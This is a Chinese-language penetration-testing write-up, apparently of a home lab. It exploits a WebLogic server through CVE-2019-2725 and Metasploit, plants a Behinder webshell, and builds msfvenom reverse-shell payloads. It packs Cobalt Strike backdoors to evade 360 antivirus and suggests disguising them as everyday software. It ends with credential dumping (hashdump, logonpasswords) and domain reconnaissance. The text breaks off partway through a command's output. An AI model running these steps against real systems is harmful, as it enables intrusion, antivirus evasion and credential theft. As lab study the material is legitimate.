+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2016-3510
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20173248
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2017-3248
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br></div></div><p>有几个检测失败了，返回去 Web 一看，原来是被 360 拦了</p> <p><img src="/assets/img/image-20220903203027582.847d239c.png" alt="image-20220903203027582"></p> <p>不过没关系，不是还有几个能用的，就从这几个入手吧</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>[*]开始检测 SSRF
+[+]The target Weblogic UDDI module is exposed!
+[+]The path is: http://192.168.111.80:7001/uddiexplorer/
+[+]Please verify the SSRF vulnerability!
+[+]SSRF 漏洞存在
+
+[*]开始检测 CVE20192725
+[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2725
+[+]CVE-2019-2725 漏洞存在
+
+[*]开始检测 CVE20192729
+[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2729
+[+]CVE-2019-2729 漏洞存在
+
+[*]开始检测 CVE20173506
+[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2017-3506
+[+]CVE-2017-3506 漏洞存在
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="后台"><a href="#后台" class="header-anchor">#</a> 后台</h3> <p>访问看一眼：http://192.168.111.80:7001/console/login/LoginForm.jsp</p> <p>随便试几个弱密码，失败；</p> <p>到网上搜默认密码，失败：</p> <p><img src="/assets/img/image-20220904154513063.82f27728.png" alt="image-20220904154513063"></p> <p>至于爆破，就算了吧。</p> <h3 id="ssrf"><a href="#ssrf" class="header-anchor">#</a> SSRF</h3> <p>到目录里看一下：</p> <p><img src="/assets/img/image-20220903203424470.d99dfa11.png" alt="image-20220903203424470"></p> <p>到 Search Public Registries 里 Search 一下，并抓包看看</p> <p><img src="/assets/img/image-20220903212150178.76d809cf.png" alt="image-20220903212150178"></p> <p><img src="/assets/img/image-20220903212428237.da023929.png" alt="image-20220903212428237"></p> <p>看起来 operator 是可更改的参数，更改后可以引起不同的报错</p> <p><img src="/assets/img/image-20220903213155825.29c3db76.png" alt="image-20220903213155825"></p> <p><img src="/assets/img/image-20220903213352928.3ca81c76.png" alt="image-20220903213352928"></p> <h3 id="cve-2019-2725"><a href="#cve-2019-2725" class="header-anchor">#</a> CVE-2019-2725</h3> <h4 id="msf"><a href="#msf" class="header-anchor">#</a> MSF</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 <span class="token operator">&gt;</span> search weblogic_des
+
+Matching Modules
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+   <span class="token comment">#  Name                                                          Disclosure Date  Rank       Check  Description</span>
+   -  ----                                                          ---------------  ----       -----  -----------
+   <span class="token number">0</span>  exploit/multi/misc/weblogic_deserialize                       <span class="token number">2018</span>-04-17       manual     Yes    Oracle Weblogic Server Deserialization RCE
+   <span class="token number">1</span>  exploit/multi/misc/weblogic_deserialize_asyncresponseservice  <span class="token number">2019</span>-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService
+   <span class="token number">2</span>  exploit/multi/misc/weblogic_deserialize_marshalledobject      <span class="token number">2016</span>-07-19       manual     No     Oracle Weblogic Server Deserialization RCE - MarshalledObject
+   <span class="token number">3</span>  exploit/multi/misc/weblogic_deserialize_unicastref            <span class="token number">2017</span>-01-25       excellent  No     Oracle Weblogic Server Deserialization RCE - RMI UnicastRef
+   <span class="token number">4</span>  exploit/multi/misc/weblogic_deserialize_rawobject             <span class="token number">2015</span>-01-28       excellent  No     Oracle Weblogic Server Deserialization RCE - Raw Object
+   <span class="token number">5</span>  exploit/multi/misc/weblogic_deserialize_badattrval            <span class="token number">2020</span>-01-15       normal     Yes    WebLogic Server Deserialization RCE - BadAttributeValueExpException
+   <span class="token number">6</span>  exploit/multi/misc/weblogic_deserialize_badattr_extcomp       <span class="token number">2020</span>-04-30       normal     Yes    WebLogic Server Deserialization RCE BadAttributeValueExpException ExtComp
+
+
+Interact with a module by name or index. For example info <span class="token number">6</span>, use <span class="token number">6</span> or use exploit/multi/misc/weblogic_deserialize_badattr_extcomp
+
+msf6 <span class="token operator">&gt;</span> use xploit/multi/misc/weblogic_deserialize_asyncresponseservice
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload cmd/unix/reverse_bash
+
+Matching Modules
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+   <span class="token comment">#  Name                                                          Disclosure Date  Rank       Check  Description</span>
+   -  ----                                                          ---------------  ----       -----  -----------
+   <span class="token number">0</span>  exploit/multi/misc/weblogic_deserialize_asyncresponseservice  <span class="token number">2019</span>-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService
+
+
+Interact with a module by name or index. For example info <span class="token number">0</span>, use <span class="token number">0</span> or use exploit/multi/misc/weblogic_deserialize_asyncresponseservice                                                                                                                                    
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using exploit/multi/misc/weblogic_deserialize_asyncresponseservice
+msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> info
+
+       Name: Oracle Weblogic Server Deserialization RCE - AsyncResponseService 
+     Module: exploit/multi/misc/weblogic_deserialize_asyncresponseservice
+   Platform: Unix, Windows, Solaris
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License <span class="token punctuation">(</span>BSD<span class="token punctuation">)</span>
+       Rank: Excellent
+  Disclosed: <span class="token number">2019</span>-04-23
+
+Provided by:
+  Andres Rodriguez - 2Secure <span class="token punctuation">(</span>@acamro<span class="token punctuation">)</span> <span class="token operator">&lt;</span>acamro@gmail.com<span class="token operator">&gt;</span>
+
+Available targets:
+  Id  Name
+  --  ----
+  <span class="token number">0</span>   Unix
+  <span class="token number">1</span>   Windows
+  <span class="token number">2</span>   Solaris
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting               Required  Description
+  ----       ---------------               --------  -----------
+  Proxies                                  no        A proxy chain of <span class="token function">format</span> type:host:port<span class="token punctuation">[</span>,type:host:port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+  RHOSTS                                   <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Us
+                                                     ing-Metasploit
+  RPORT      <span class="token number">7001</span>                          <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
+  SSL        <span class="token boolean">false</span>                         no        Negotiate SSL/TLS <span class="token keyword">for</span> outgoing connections
+  TARGETURI  /_async/AsyncResponseService  <span class="token function">yes</span>       URL to AsyncResponseService
+  VHOST                                    no        HTTP server virtual <span class="token function">host</span>
+
+Payload information:
+
+Description:
+  An unauthenticated attacker with network access to the Oracle 
+  Weblogic Server T3 interface can send a malicious SOAP request to 
+  the interface WLS AsyncResponseService to execute code on the 
+  vulnerable host.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2017-10271
+  CNVD-C <span class="token punctuation">(</span><span class="token number">2019</span>-48814<span class="token punctuation">)</span>
+  http://www.cnvd.org.cn/webinfo/show/4999
+  https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html
+  https://twitter.com/F5Labs/status/1120822404568244224
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br></div></div><div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.111.80
+rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.111.80
+msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.111.128
+lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.111.128
+msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> target Windows
+target <span class="token operator">=</span><span class="token operator">&gt;</span> Windows
+msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 
+
+Module options <span class="token punctuation">(</span>exploit/multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span>:
+
+   Name       Current Setting               Required  Description
+   ----       ---------------               --------  -----------
+   Proxies                                  no        A proxy chain of <span class="token function">format</span> type:host:port<span class="token punctuation">[</span>,type:host:port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+   RHOSTS     <span class="token number">192.168</span>.111.80                <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/U
+                                                      sing-Metasploit
+   RPORT      <span class="token number">7001</span>                          <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
+   SSL        <span class="token boolean">false</span>                         no        Negotiate SSL/TLS <span class="token keyword">for</span> outgoing connections
+   TARGETURI  /_async/AsyncResponseService  <span class="token function">yes</span>       URL to AsyncResponseService
+   VHOST                                    no        HTTP server virtual <span class="token function">host</span>
+
+
+Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
+   LHOST     <span class="token number">192.168</span>.111.128  <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
+   LPORT     <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span class="token number">1</span>   Windows
+
+
+msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.111.128:4444 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Generating payload<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending payload<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><p>失败，360 拦下来了</p> <p><img src="/assets/img/image-20220904160410608.6806405b.png" alt="image-20220904160410608"></p> <h4 id="漏洞-webshell"><a href="#漏洞-webshell" class="header-anchor">#</a> 漏洞 WebShell</h4> <h5 id="java反序列化漏洞利用工具-冰蝎-反弹-shell"><a href="#java反序列化漏洞利用工具-冰蝎-反弹-shell" class="header-anchor">#</a> Java反序列化漏洞利用工具 + 冰蝎 反弹 Shell</h5> <p>tasklist 发现 360</p> <p><img src="/assets/img/image-20220904163431356.cad14dba.png" alt="image-20220904163431356"></p> <p><img src="/assets/img/image-20220904163651371.3fe0de3a.png" alt="image-20220904163651371"></p> <p>将 <a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener noreferrer">冰蝎<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 的Server传上WEB</p> <blockquote><p>Requset <a href="https://www.oracle.com/java/technologies/downloads/" target="_blank" rel="noopener noreferrer">JRE<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 1.8+</p></blockquote> <p><img src="/assets/img/image-20220905193231829.dd1579bb.png" alt="image-20220905193231829"></p> <p>冰蝎连接，成功：</p> <p><img src="/assets/img/image-20220905193450444.05ed9587.png" alt="image-20220905193450444"></p> <p>看看系统信息</p> <p><img src="/assets/img/image-20220906012948157.aae3aaa7.png" alt="image-20220906012948157"></p> <p>Shell 也返回成功了</p> <p><img src="/assets/img/image-20220906013521880.919b163e.png" alt="image-20220906013521880"></p> <h5 id="msf-反弹-shell"><a href="#msf-反弹-shell" class="header-anchor">#</a> MSF 反弹 Shell</h5> <p>生成 PHP 后门</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token punctuation">]</span>
+└─<span class="token comment"># msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.111.128 lport=9999 -f raw &gt;houmen.php                              </span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> No platform was selected<span class="token punctuation">,</span> choosing <span class="token class-name static-context">Msf</span><span class="token operator">::</span><span class="token class-name static-context">Module</span><span class="token operator">::</span><span class="token class-name static-context">Platform</span><span class="token operator">::</span><span class="token constant">PHP</span> from the payload
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> No arch selected<span class="token punctuation">,</span> selecting arch<span class="token punctuation">:</span> php from the payload
+No encoder specified<span class="token punctuation">,</span> outputting raw payload
+Payload size<span class="token punctuation">:</span> <span class="token number">1116</span> bytes
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="/assets/img/image-20220906013850233.a4f71a01.png" alt="image-20220906013850233"></p> <p>构造免杀</p> <p>工具：<a href="https://github.com/xZero707/Bamcompile" target="_blank" rel="noopener noreferrer">Release bamcompile1.21.zip · xZero707/Bamcompile (github.com)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <div class="language-powershell line-numbers-mode"><pre class="language-powershell"><code><span class="token function">PS</span> D:\ProgramOthers\Security\bamcompile1<span class="token punctuation">.</span>21&gt; <span class="token punctuation">.</span>\bamcompile<span class="token punctuation">.</span>exe <span class="token operator">-</span>w <span class="token operator">-</span>c <span class="token punctuation">.</span>\houmen<span class="token punctuation">.</span>php <span class="token punctuation">.</span>\miansha<span class="token punctuation">.</span>exe
+
+Bambalam PHP EXE Compiler/Embedder 1<span class="token punctuation">.</span>21
+
+Windowed application
+Compress
+Mainfile: <span class="token punctuation">.</span>\houmen<span class="token punctuation">.</span>php
+Outfile: <span class="token punctuation">.</span>\miansha<span class="token punctuation">.</span>exe
+
+Encoding and embedding <span class="token punctuation">.</span>\houmen<span class="token punctuation">.</span>php
+Compressing final exe<span class="token punctuation">.</span><span class="token punctuation">.</span>
+Compression done
+
+<span class="token punctuation">.</span>\miansha<span class="token punctuation">.</span>exe created successfully!
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>得到免杀 EXE</p> <p><img src="/assets/img/image-20220906014757932.f8350d0d.png" alt="image-20220906014757932"></p> <p>将其上传到 WEB 中，然后开启监听，运行miasha.exe，成功反弹</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 <span class="token operator">&gt;</span> use exploit/multi/handler 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp
+msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 
+
+Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options <span class="token punctuation">(</span>generic/shell_reverse_tcp<span class="token punctuation">)</span>:
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
+   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span class="token number">0</span>   Wildcard Target
+
+
+msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.111.128
+lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.111.128
+msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">9999</span>
+lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">9999</span>
+msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcp
+payload <span class="token operator">=</span><span class="token operator">&gt;</span> php/meterpreter/reverse_tcp
+msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.111.128:9999 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">39282</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.111.80
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">3</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.111.128:9999 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.111.80:53897 <span class="token punctuation">)</span> at <span class="token number">2022</span>-09-05 <span class="token number">13</span>:54:37 -0400
+
+meterpreter <span class="token operator">&gt;</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><h5 id="cs"><a href="#cs" class="header-anchor">#</a> CS</h5> <p>新建监听器</p> <p><img src="/assets/img/image-20220906235842928.a213cd1d.png" alt="image-20220906235842928"></p> <p>生成后门</p> <p><img src="/assets/img/image-20220906155511478.561aa14e.png" alt="image-20220906155511478"></p> <p>上传后门</p> <p><img src="/assets/img/image-20220906235950361.ca6f506f.png" alt="image-20220906235950361"></p> <p><s>怪了这360怎么一点反应都没有</s></p> <p>运行起来就有反应了</p> <p><img src="/assets/img/image-20220907000127567.d6fd3462.png" alt="image-20220907000127567"></p> <p>用 BypassAV, Restorator，再加壳，手动云查杀一下看看结果：</p> <p><img src="/assets/img/image-20220907153445579.c3e7d8f4.png" alt="image-20220907153445579"></p> <p>试了几种方法，得出了个不知道严不严谨的结论</p> <blockquote><p>后门得用户自己打开才行（不会报毒）</p> <p>远程执行就算是绕着几个弯也还是会报入侵服务器</p></blockquote> <p>那就暂时先模拟诱惑用户主动点击吧，毕竟可以伪造成日用软件。（当然，也可以用 MSF 派生 CS Shell）</p> <p>双击打开 云查杀也不报毒的 artifact1.exe</p> <p>成功反弹</p> <p><img src="/assets/img/image-20220907155321492.08f2e0d9.png" alt="image-20220907155321492"></p> <p>提权</p> <p><img src="/assets/img/image-20220907162927468.81869240.png" alt="image-20220907162927468"></p> <h3 id="信息收集-2"><a href="#信息收集-2" class="header-anchor">#</a> 信息收集</h3> <h4 id="抓取明文密码"><a href="#抓取明文密码" class="header-anchor">#</a> 抓取明文密码</h4> <div class="language- line-numbers-mode"><pre class="language-text"><code>hashdump
+logonpasswords
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/assets/img/image-20220907163238560.caab7da2.png" alt="image-20220907163238560"></p> <h4 id="主机信息"><a href="#主机信息" class="header-anchor">#</a> 主机信息</h4> <blockquote><p>常用命令</p> <p>systeminfo  				//查看操作系统信息
+ipconfig /all  				//查询本机ip段，所在域等
+whoami   					//查看当前用户权限
+net user						//查看本地用户
+net localgroup administrators	//查看本地管理员组(通常 包含域用户)</p></blockquote> <p>系统信息</p> <p><img src="/assets/img/image-20220908182619727.6f5dc727.png" alt="image-20220908182619727"></p> <p>IP 信息</p> <p><img src="/assets/img/image-20220908183702411.00d70449.png" alt="image-20220908183702411"></p> <p>两个网络</p> <blockquote><p>192.168.111.80</p> <p>10.10.10.80</p></blockquote> <p>还是 MSF 用着顺手，用冰蝎反弹 Shell 过去</p> <p><img src="/assets/img/image-20220908184546973.7f47b8c8.png" alt="image-20220908184546973"></p> <h4 id="域信息收集"><a href="#域信息收集" class="header-anchor">#</a> 域信息收集</h4> <blockquote><p>常用命令：</p> <p>net config workstation     				// 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等
+net view /domain              				// 查看域
+net time /domain          					// 主域服务器会同时作为时间服务器
+net user /domain      						// 查看域用户
+net group /domain							// 查看域内用户组列表
+net group &quot;domain computers&quot; /domain      	// 查看域内的机器
+net group &quot;domain controllers&quot; /domain          // 查看域控制器组
+net group &quot;Enterprise Admins&quot; /domain   		// 查看域管理员组</p></blockquote> <p>域配置</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>c:<span class="token punctuation">\</span><span class="token operator">&gt;</span>net config workstation
+net config workstation
+Computer name                        <span class="token punctuation">\</span><span class="token punctuation">\</span>WEB
+Full Computer name                   WEB.de1ay.com
+User name                            de1ay
+
+Workstation active on                
